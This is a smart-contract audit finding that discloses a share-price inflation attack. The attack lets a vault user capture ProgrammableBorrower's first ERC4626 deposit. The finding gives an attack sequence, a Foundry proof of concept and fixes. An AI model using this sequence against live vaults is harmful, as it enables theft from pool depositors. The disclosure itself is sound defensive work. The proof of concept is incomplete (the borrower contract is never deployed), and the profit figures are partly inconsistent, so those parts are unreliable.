### Title
ERC4626 share-price inflation via unslippaged `_depositToVault` lets any vault user steal pool deposits - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` parks pool capital in an external ERC4626 `vault` and calls `vault.deposit()` without a `minShares` check or any validation of the returned share amount. Any user of that vault (an explicitly unprivileged role) can execute the classic first-depositor share-inflation attack: mint 1 share, donate underlying directly to the vault to inflate the price per share, then let `ProgrammableBorrower` deposit the pool's funds and receive 0 shares. The attacker redeems their single share to capture the pool's deposit; the resulting shortfall is pushed onto tranche holders via the default path.

### Finding Description
The analog of the unsafe-fallback deserialization bug (trusting attacker-controlled input without validation) is the unchecked trust in the external vault's share conversion. `_depositToVault` discards the return value of `vault.deposit` entirely: [1](#0-0) 

The deposit is triggered in two places reachable during normal (honest-manager) sequencing:
- `onStartEpoch` deposits the entire idle balance at epoch start: [2](#0-1) 
- `_repay` redeploys borrower repayments into the vault while an epoch is active: [3](#0-2) 

Attack preconditions: the configured vault has `totalSupply == 0` when the facility makes its first deposit (fresh vault, or fully withdrawn vault — `setVault` requires `vault.balanceOf(this) == 0` but does not require the vault to have pre-existing supply: [4](#0-3) ).

Sequence:
1. Attacker (any EOA, a vault user) deposits 1 wei of underlying into the empty vault, receiving 1 share.
2. Attacker transfers `D` underlying directly to the vault contract, making `convertToAssets(1) ≈ 1 + D`. No donation-isolation exists because the "skim" concept applies only inside IdleCDO, not the external vault.
3. Honest manager calls `startEpoch`/`stopEpoch` so `onStartEpoch` runs `_depositToVault(balance, 0)` with `balance = P`. ERC4626 `convertToShares` rounds down: `P * 1 / (1 + D) = 0` shares when `P <= D`. The deposit succeeds and transfers `P` underlying to the vault; `ProgrammableBorrower` holds 0 shares.
4. Attacker calls `vault.redeem(1, ...)` and withdraws `≈ P + D`, profiting `P`.
5. At `stopEpoch`, `onStopEpoch` finds `shortfall > _currentVaultAssets() == 0`, returns `true`, then IdleCDO's `getFundsFromBorrower` `transferFrom` fails, routing into `_handleBorrowerDefault` — the stolen funds are recorded as a borrower loss socialized to tranche holders: [5](#0-4) 

The same rounding applies on every subsequent deposit, but the profitable version requires the attacker to own all supply, so it fires on the first deposit into an empty vault (including after a `setVault` switch to a fresh vault). Additionally, `borrow` and `onStopEpoch` call `vault.withdraw`/`redeem` results without invariant checks, so an inflated vault where the contract holds dust shares records phantom "vault loss" that `_vaultNetInterest` converts into reduced `totalInterestDueNow`.

### Impact Explanation
Direct theft of the full first deposit `P` minus the attacker's donation `D`, bounded only by vault economics (net profit `P - D`, maximized by donating just under `P`). The loss is then socialized across tranche holders through the default/loss-accounting path rather than being absorbed by the attacker. Quantified: for a facility depositing 1,000,000 USDC into an empty vault, an attacker donating ~999,999 USDC can capture ~999,999 USDC net (attacker cost ~1 share + donation, recovered on redeem). This breaks the fair-mint/deposit invariant and causes insolvency equal to the stolen amount.

### Likelihood Explanation
Requires the vault to be empty (`totalSupply == 0`) at the moment of the pool's first deposit — true whenever a facility is initialized with a freshly deployed or fully-drained ERC4626 vault, and again after `setVault` switches to a new empty vault (guard only checks the contract's own share balance, not vault supply). The attacker needs only to be a vault user plus a direct token sender — both permitted unprivileged roles — and must front ~`P` capital briefly (recoverable on redeem). No privileged cooperation is needed; the honest manager's `startEpoch` call is the trigger. Conditions are configuration-dependent, hence not certain, but the attack is fully atomic-able via frontrunning `initialize`/`onStartEpoch` in the same block.

### Recommendation
- In `_depositToVault`, check `shares` returned by `vault.deposit` and revert if `shares == 0` or below a `minSharesOut` bound derived from `convertToShares(_assetAmount)` tolerance.
- Seed new vaults with a dead-share deposit (e.g., burn shares to `address(1)`) at `initialize`/`setVault`, or require `vault.totalSupply() > MIN_SUPPLY` before enabling deposits.
- Alternatively use `mint` with an exact share target, or wrap deposits in a try/revert on `convertToAssets(shares) < expected` sanity bound.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ProgrammableBorrower} from "contracts/strategies/idle/ProgrammableBorrower.sol";
import {ERC4626, ERC20} from "solmate/tokens/ERC4626.sol";
import {ERC20Mock} from "test/mocks/ERC20Mock.sol"; // adjust to repo mocks

contract VaultInflationTheft is Test {
    ERC20Mock underlying;
    ERC4626 vault;          // fresh vault, totalSupply == 0
    ProgrammableBorrower pb;
    address idleCDO = address(0xCD0);
    address attacker = address(0xA77);
    uint256 constant P = 1_000_000e6;  // pool first deposit

    function setUp() public {
        underlying = new ERC20Mock("USDC", "USDC", 6);
        vault = new ERC4626(underlying, "v", "v");
        // deploy+init pb with vault, idleCDO, honest borrower/manager (mirrors CreditVault test setup)
        // pb.initialize(address(vault), idleCDO, owner, manager, borrower, 0);
        underlying.mint(address(pb), P); // simulate funds sent by IdleCDO/strategy
    }

    function testStealFirstDeposit() public {
        // 1. attacker: 1 wei deposit + donation of P
        underlying.mint(attacker, P + 1);
        vm.startPrank(attacker);
        underlying.approve(address(vault), 1);
        vault.deposit(1, attacker);                 // 1 share
        underlying.transfer(address(vault), P);     // inflate price to ~P assets/share
        vm.stopPrank();

        // 2. honest flow: epoch start deposits pool balance
        vm.prank(idleCDO);
        pb.onStartEpoch(0);                          // _depositToVault(P) -> 0 shares minted
        assertEq(vault.balanceOf(address(pb)), 0);   // pool got nothing

        // 3. attacker redeems 1 share for ~2P - 1, netting ~P stolen
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);
        assertGe(underlying.balanceOf(attacker), P); // attacker profit ~ P

        // 4. stopEpoch: vault position empty -> transferFrom shortfall -> default
        // (recorded loss socialized to tranche holders)
    }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L158-169)
```text
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-219)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-385)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L524-527)
```text
    if (epochAccountingActive) {
      // Current-epoch borrower interest must remain visible as profit at stopEpoch, while principal,
      // previously-fronted debt, and any excess repayment should only extend the epoch principal baseline.
      _depositToVault(totalRepaidAssets, totalRepaidAssets - currentEpochInterestPaid);
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-404)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }
```
